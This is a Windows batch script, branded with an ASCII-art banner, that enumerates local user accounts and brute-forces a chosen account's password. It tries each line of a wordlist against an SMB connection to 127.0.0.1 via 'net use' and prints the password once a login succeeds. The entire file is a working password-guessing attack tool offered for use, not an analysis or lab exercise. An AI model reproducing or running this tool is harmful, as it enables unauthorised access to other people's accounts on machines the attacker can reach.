@echo off
title L4Ta's User Bruteforce Tool ⚔
setlocal enabledelayedexpansion
chcp 65001 >nul

::==========================
:: Main Menu
::==========================
:start
cls
color 0F
set "error=-"
set "user="
set "wordlist="

echo.
echo          ██╗     █████╗ ████████╗ █████╗     ██╗   ██╗███████╗
echo          ██║    ██╔══██╗╚══██╔══╝██╔══██╗    ██║   ██║██╔════╝
echo          ██║    ███████║   ██║   ███████║    ██║   ██║█████╗  
echo          ██║    ██╔══██║   ██║   ██╔══██║    ╚██╗ ██╔╝██╔══╝  
echo          ███████╗██║  ██║   ██║   ██║  ██║     ╚████╔╝ ███████╗
echo          ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝      ╚═══╝  ╚══════╝
echo.                    Made by: Ebola Man ⚙ - customized by: L4Ta
echo.

echo    ╔══════════════════════════════╗
echo    ║       MENU OPTIONS           ║
echo    ║                              ║
echo    ║  1. List Local Users         ║
echo    ║  2. Start Bruteforce         ║
echo    ║  3. Exit                     ║
echo    ╚══════════════════════════════╝
echo.

choice /c 123 /n /m "Select an option [1-3]: "
if %errorlevel%==1 goto listusers
if %errorlevel%==2 goto bruteforce
if %errorlevel%==3 exit

::==========================
:: List Users
::==========================
:listusers
cls
echo.
echo [*] Local user accounts:
echo.
wmic useraccount where "localaccount='true'" get name,sid,status
echo.
pause
goto start

::==========================
:: Bruteforce Logic
::==========================
:bruteforce
cls
set /a count=1
echo.
set /p "user=Enter target username: "
echo.
set /p "wordlist=Enter path to password list: "

if not exist "%wordlist%" (
  echo.
  echo [!] Error: Password list not found!
  pause
  goto start
)

net user %user% >nul 2>&1
if %errorlevel% NEQ 0 (
  echo.
  echo [!] Error: User '%user%' does not exist.
  pause
  goto start
)

net use \\127.0.0.1 /d /y >nul 2>&1
echo.
echo [*] Starting bruteforce...
echo ---------------------------------------

for /f "usebackq tokens=* delims=" %%a in ("%wordlist%") do (
  set "pass=%%a"
  call :trylogin
)

echo.
echo [X] Password not found.
pause
goto start

::==========================
:: Attempt Login
::==========================
:trylogin
net use \\127.0.0.1 /user:%user% "!pass!" >nul 2>&1
echo [Attempt !count!] Trying: !pass!
set /a count+=1
net use | findstr /I "\\127.0.0.1" >nul && goto success
exit /b

::==========================
:: Success Handler
::==========================
:success
echo.
echo [+] Success! Password found: !pass!
net use \\127.0.0.1 /d /y >nul 2>&1
pause
goto start
